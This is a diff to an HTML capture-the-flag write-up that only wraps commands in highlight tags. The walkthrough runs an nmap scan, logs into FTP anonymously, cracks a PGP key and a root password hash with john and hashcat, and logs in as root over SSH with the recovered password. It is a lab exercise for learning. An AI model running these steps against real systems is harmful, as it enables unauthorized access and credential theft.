@@ -66,7 +66,7 @@
 <br>
 <p>Ok so lets start of with a simple Nmap</p>
 <br>
-<p>nmap -v -sC -sV -oA nmap  10.10.177.146</p>
+<p><span class="highlight">nmap -v -sC -sV -oA nmap  10.10.177.146</span></p>
 <br>
 <img src="./anon/1.PNG">
 <br>
@@ -74,7 +74,7 @@
 <br>
 <p>So looks like we can only work with an ftp and a ssh. The ftp seems to be able to login with Anonymous creds, lets try it!</p>
 <br>
-<p>ftp 10.10.177.146</p>
+<p><span class="highlight"><span class="highlight">ftp 10.10.177.146</span></p>
 <br>
 <p>anonymous:anonymous</p>
 <br>
@@ -102,35 +102,35 @@
 <br>
 <p>So looks like were gonna have to crack it, lets use gpg2john</p>
 <br>
-<p>gpg --import private.asc</p>
+<p><span class="highlight">gpg --import private.asc</span></p>
 <br>
 <img src="./anon/9.PNG">
 <br>
-<p>sudo gpg2john backup.pgp > backupBop</p>
+<p><span class="highlight">sudo gpg2john backup.pgp > backupBop</span></p>
 <br>
 <img src="./anon/10.PNG">
 <br>
-<p>sudo gpg2john private.asc > privateBop</p>
+<p><span class="highlight">sudo gpg2john private.asc > privateBop</span></p>
 <br>
 <img src="./anon/11.PNG">
 <br>
-<p>sudo john privateBop</p>
+<p><span class="highlight">sudo john privateBop</span></p>
 <br>
 <img src="./anon/12.PNG">
 <br>
-<p>gpg --import private.asc</p>
+<p><span class="highlight">gpg --import private.asc</span></p>
 <br>
 <img src="./anon/13.PNG">
 <br>
-<p>gpg --decrypt backup.pgp</p>
+<p><span class="highlight">gpg --decrypt backup.pgp</span></p>
 <br>
 <img src="./anon/14.PNG">
 <br>
 <p>Ok cool looks like we got the passwd file, lets crack the root password!</p>
 <br>
-<p>echo '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > hash</p>
+<p><span class="highlight">echo '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > hash</span></p>
 <br>
-<p>hashcat -m 1800 hash --wordlist /usr/share/wordlists/rockyou.txt --force</p>
+<p><span class="highlight">hashcat -m 1800 hash --wordlist /usr/share/wordlists/rockyou.txt --force</span></p>
 <br>
 <img src="./anon/15.PNG">
 <br>
@@ -138,7 +138,7 @@
  <br>
 <p>root:hikari</p>
 <br>
-<p>ssh root@10.10.177.146</p>
+<p><span class="highlight">ssh root@10.10.177.146</p>
 <br>
 <img src="./anon/16.PNG">
 <br>
